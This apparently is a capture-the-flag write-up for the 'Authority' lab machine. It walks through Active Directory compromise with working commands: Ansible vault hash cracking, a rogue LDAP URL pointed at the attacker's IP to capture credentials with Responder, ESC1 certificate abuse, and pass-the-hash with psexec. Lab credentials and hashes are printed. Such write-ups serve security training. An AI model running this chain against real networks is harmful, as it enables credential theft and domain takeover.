
## CTF Writeup: Authority

---
## Reconnaissance

An initial scan revealed the following information about the running services on the target server.

```
nmap -n -Pn -sSCV -p- -oN nmap.txt 10.129.229.56      
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-09 08:36 -0500
Nmap scan report for 10.129.229.56
Host is up (0.017s latency).
Not shown: 65507 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-08-09 17:36:58Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN:AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
|_ssl-date: 2026-08-09T17:38:03+00:00; +4h00m01s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN:AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
|_ssl-date: 2026-08-09T17:38:03+00:00; +4h00m01s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-08-09T17:38:03+00:00; +4h00m01s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN:AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-08-09T17:38:03+00:00; +4h00m01s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN:AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
8443/tcp  open  ssl/http      Apache Tomcat (language: en)
| tls-alpn: 
|_  h2
| ssl-cert: Subject: commonName=172.16.2.118
| Not valid before: 2026-08-07T17:33:57
|_Not valid after:  2028-08-09T05:12:21
|_ssl-date: TLS randomness does not represent time
|_http-title: Site doesn't have a title (text/html;charset=ISO-8859-1).
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49690/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49691/tcp open  msrpc         Microsoft Windows RPC
49693/tcp open  msrpc         Microsoft Windows RPC
49694/tcp open  msrpc         Microsoft Windows RPC
49703/tcp open  msrpc         Microsoft Windows RPC
49711/tcp open  msrpc         Microsoft Windows RPC
58690/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: AUTHORITY; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-08-09T17:37:54
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: mean: 4h00m00s, deviation: 0s, median: 4h00m00s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 110.55 seconds
```

The target seems to be an Domain Controller. The TCP Scan reveals the FQDN of the target authority.authority.htb, the target domain authority.htb & the Hostname of the target Authority and some more SAN's. Let's map them all to the target ip address in our local dns file.

```
echo "10.129.229.56 authority.htb.corp htb.corp authority.authority.htb authority.htb authority" | tee -a /etc/hosts
```

Started off with enumerating anonymous & guest user access. Anonymous Acces was denied, but the guest user seems to not be disabled!

We enumerated 2 non-default smb shares "Department Shares" & "Development". We have read permissions on the Development share. Let's check it out. 

```
nxc smb authority.htb -u 'guest' -p '' --shares
```

Connected to the SMB Share.

```
smbclient \\\\authority.htb/Development -U guest
```

I downloaded all files onto my local machine.

```
recurse ON
prompt OFF
mget *
```

It seems to be an directory in which a lot of automation scripts are stored. I was able to find credentials in an file: 

```
administrator:Welcome1
```

We also found interesting encrypted credentials for ldap and pwm. In which we'll need the Ansible Vault Password for, otherwise we can't decrypt them. Is "Welcome1" the password?

Tested it, but it doesn't seem to be the vault password.

```
ansible-vault decrypt main.yml --ask-vault-pass
```

We get information about an service account called "svc_pwm" in ansible.cfg.

I was also able to discover tomcat credentials.

```
admin:T0mc@tAdm1n
robot:T0mc@tR00t
```

Discovered a passphrase in the ADCS Directory.

```
admin@authority.htb:SuP3rS3creT
```

Proceeded with enumerating users and stored the output in an newusers.txt file.

```
nxc smb authority.htb -u 'guest' -p '' --rid-brute > newusers.txt
```

I decided to view the webpage running on port 8443 and got forwarded to an login panel on an /pwm endpoint. 

I couldn't login with the retrieved passwords. From here on I had to research.

The encoded ansible passwords were the way in! Since there is an tool which can convert ansible two hash format called "ansible2john".

Let's first format all the whitespaces of the encoded credentials accordingly.

```
https://gchq.github.io/CyberChef
```

Utilize Find / Replace Operation.

Paste this in Find variable.

```
(\$ANSIBLE_VAULT;1\.1;AES256)([0-9a-fA-F]{64})([0-9a-fA-F]+)
```

This in Replace Variable

```
$1\n$2\n$3
```


Stored all of them in files on my local machine. We now need to convert them into hash format using ansible2john, which comes pre-installed with Kali Linux.

```
ansible2john pwm_admin_password > pass_hash
```

Let's crack them now!

```
john ldap_hash --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (ansible, Ansible Vault [PBKDF2-SHA256 HMAC-256 256/256 AVX2 8x])
Cost 1 (iteration count) is 10000 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
!@#$%^&*         (ldap_admin_password)     
1g 0:00:00:08 DONE (2026-08-10 07:03) 0.1148g/s 4570p/s 4570c/s 4570C/s 112500..victor2
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

The password:

```
!@#$%^&*
```

Let's now decrypt the ansible-vault to get the password.

```
ansible-vault decrypt ldap_admin_password --ask-vault-pass
Vault password: 
Decryption successful
```

We now have the first password.

```
cat ldap_admin_password 
DevT3st@123
```

Cracked the other:

```
john login_hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (ansible, Ansible Vault [PBKDF2-SHA256 HMAC-256 256/256 AVX2 8x])
Cost 1 (iteration count) is 10000 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
!@#$%^&*         (pwm_admin_login)     
1g 0:00:00:11 DONE (2026-08-10 07:07) 0.08818g/s 3510p/s 3510c/s 3510C/s 112500..victor2
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Oddly enough we couldn't get the pwm_admin-login.

```
ansible-vault decrypt pwm_admin_login --ask-vault-pass    
Vault password: 
Decryption successful
```

```
cat pwm_admin_login   
svc_pwm
```

Cracked the last hash.

```
john pass_hash --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (ansible, Ansible Vault [PBKDF2-SHA256 HMAC-256 256/256 AVX2 8x])
Cost 1 (iteration count) is 10000 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
!@#$%^&*         (pwm_admin_password)     
1g 0:00:00:12 DONE (2026-08-10 07:08) 0.08210g/s 3268p/s 3268c/s 3268C/s 112500..victor2
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Cracked the vault password.

```
hashcat -m 16900 pass_hash /usr/share/wordlists/rockyou.txt --username
!@#$%^&*
```

Decrypted the vault.

```
ansible-vault decrypt pwm_admin_password --ask-vault-pass 
Vault password: 
Decryption successful
```

```
cat pwm_admin_password 
pWm_@dm!N_!23
```

Stored those credentials in our wordlists. Sprayed credentials again, but couldn't get a hint.

```
nxc smb authority.htb -u users.txt -p passwords.txt --continue-on-success
```

I navigated onto the website running on port 8443 again and logged into the configuration manager with one of the retrieved passwords. Interestingly enough we are able to add LDAP Connections! Since we are in the internal network. We are able to potentially call an reverse connection to our local machine which could harvest credentials of the ldap service account, which we previously discovered! Let's test it out. 

Started up responder on my local machine.

```
responder -I tun0
```

Navigated to LDAP Directories > default > Connection > LDAP URLs & pressed on Add value.

```
ldap://10.10.14.57:389
```

Retrieved creds of the ldap service account.

```
[LDAP] Cleartext Client   : 10.129.229.56
[LDAP] Cleartext Username : CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb
[LDAP] Cleartext Password : lDaP_1n_th3_cle4r!
```

Sprayed the credentials against WinRM and found out that we can connect to the target machine using this service account!

```
nxc winrm authority.htb -u svc_ldap -p lDaP_1n_th3_cle4r!
WINRM       10.129.229.56   5985   AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 (name:AUTHORITY) (domain:authority.htb) 
WINRM       10.129.229.56   5985   AUTHORITY        [+] authority.htb\svc_ldap:lDaP_1n_th3_cle4r! (Pwn3d!)
```

Connected to the Domain Controller.

```
evil-winrm -i authority.htb -u svc_ldap -p 'lDaP_1n_th3_cle4r!'
```

Retrieved user.txt in C:\Users\svc_ldap\Desktop.

```
ea57f983331ebbc0cc6eace9a64260d8
```
## Privilege Escalation

The current user doesn't seem to have any interesting privileges.

```
whoami /all
```

I found an interesting directory in the root of the Domain Controller called "Certs" in which there is an LDAPs.pfx file stored. Let's download the pfx onto my local machine using evil-winrm's in-built function.

```
download LDAPs.pfx
```

Converted the .pfx file into hash.

```
pfx2john LDAPs.pfx > hash
```

Tried bruteforcing an passphrase out of the hash, but wasn't successful.

```
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

Decided to proceed with downloading domain information and uploading it onto bloodhound.

```
bloodhound-python -u svc_ldap -p 'lDaP_1n_th3_cle4r!' -ns 10.129.229.56 -d authority.htb -c all
```

But it didn't seem like this will be the way to privesc. Since I previously discovered that ADCS seems to be active, let's check out if there is any ADCS Attacks we can leverage!

```
certipy-ad find -u svc_ldap -p 'lDaP_1n_th3_cle4r!' -dc-ip 10.129.229.56 -target authority.htb -vulnerable -enabled
```

Found out that the target Domain Controller is vulnerable to ESC1 Attack.

```
cat 20260810082037_Certipy.txt
[+] User Enrollable Principals      : AUTHORITY.HTB\Domain Computers
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.
```

As we can see Domain Computers can abuse ESC1 Attacks, let's therefore add an Computer onto the target.

```
impacket-addcomputer 'authority.htb/svc_ldap' -method LDAPS -computer-name saitama -computer-pass 'password123!' -dc-ip 10.129.229.56
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Successfully added machine account saitama$ with password password123!.
```

Requested administrator.pfx file using the previously created machine account.

```
certipy-ad req -u saitama$ -password 'password123!' -ca AUTHORITY-CA -dc-ip 10.129.229.56 -template CorpVPN -upn administrator@authority.htb
```

Retrieved NTLM Hash of Administrator User.

```
certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.229.56
```

Connected to the Domain Controller.

```
impacket-psexec Administrator@authority.htb -hashes aad3b435b51404eeaad3b435b51404ee:6961f422924da90a6928197429eea4ed
```

Retrieved root.txt in C:\Users\Administrator\Desktop.

```
baecb00312abaa084aa386d5497ab290
```